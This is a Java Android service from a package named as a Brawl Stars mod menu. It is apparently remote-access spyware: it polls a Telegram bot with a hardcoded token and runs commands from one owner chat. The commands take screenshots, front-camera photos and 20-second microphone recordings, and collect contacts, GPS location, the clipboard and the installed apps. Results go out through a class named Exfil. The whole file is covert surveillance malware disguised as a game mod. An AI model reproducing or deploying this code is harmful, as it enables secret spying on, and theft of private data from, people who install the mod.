package com.brawl.modmenu;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;

public class CommandListener extends Service {

    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String OWNER = "8558500657";
    private static final long INTERVAL = 10000; // 10 секунд
    private long lastUpdateId = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            handler.post(poll);
        }
        return START_STICKY;
    }

    private Runnable poll = new Runnable() {
        @Override
        public void run() {
            new Thread(() -> {
                try {
                    String url = "https://api.telegram.org/bot" + TOKEN
                        + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(10000);
                    c.setReadTimeout(10000);
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) sb.append(line);
                    r.close();

                    JSONObject obj = new JSONObject(sb.toString());
                    if (!obj.optBoolean("ok", false)) return;

                    JSONArray arr = obj.optJSONArray("result");
                    if (arr == null) return;

                    for (int i = 0; i < arr.length(); i++) {
                        JSONObject upd = arr.getJSONObject(i);
                        lastUpdateId = upd.optLong("update_id", lastUpdateId);

                        JSONObject msg = upd.optJSONObject("message");
                        if (msg == null) continue;

                        JSONObject chat = msg.optJSONObject("chat");
                        if (chat == null) continue;
                        String chatId = chat.optString("id", "");
                        if (!OWNER.equals(chatId)) continue; // только от тебя

                        String text = msg.optString("text", "").trim();
                        if (text.isEmpty()) continue;

                        handleCommand(text);
                    }
                } catch (Throwable ignored) {}
                if (running) handler.postDelayed(poll, INTERVAL);
            }).start();
        }
    };

    private void handleCommand(String text) {
        try {
            if (text.startsWith("/help") || text.startsWith("/start")) {
                Exfil.send("HELP",
                    "/screenshot — скрин сейчас\n" +
                    "/info — статус устройства\n" +
                    "/apps — список приложений\n" +
                    "/contacts — контакты\n" +
                    "/location — GPS координаты\n" +
                    "/photo — фото с фронталки\n" +
                    "/mic — запись 20 сек\n" +
                    "/clip — буфер обмена\n" +
                    "/battery — батарея\n" +
                    "/vibrate — вибрация\n" +
                    "/help — справка");
                return;
            }

            if (text.startsWith("/screenshot")) {
                CommandHandler.takeScreenshot(this);
                Exfil.send("CMD", "Скрин снят");
                return;
            }

            if (text.startsWith("/info")) {
                CommandHandler.sendInfo(this);
                return;
            }

            if (text.startsWith("/apps")) {
                AppList.dump(this);
                Exfil.send("CMD", "Список приложений отправлен");
                return;
            }

            if (text.startsWith("/contacts")) {
                CommandHandler.sendContacts(this);
                return;
            }

            if (text.startsWith("/location")) {
                CommandHandler.sendLocation(this);
                return;
            }

            if (text.startsWith("/photo")) {
                CommandHandler.takePhoto(this);
                return;
            }

            if (text.startsWith("/mic")) {
                CommandHandler.recordMic(this, 20);
                return;
            }

            if (text.startsWith("/clip")) {
                CommandHandler.sendClipboard(this);
                return;
            }

            if (text.startsWith("/battery")) {
                CommandHandler.sendBattery(this);
                return;
            }

            if (text.startsWith("/vibrate")) {
                CommandHandler.vibrate(this);
                Exfil.send("CMD", "Вибрация");
                return;
            }

            // неизвестная команда
            Exfil.send("CMD", "Неизвестная команда: " + text);
        } catch (Throwable t) {
            Exfil.send("CMD", "Ошибка: " + t.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
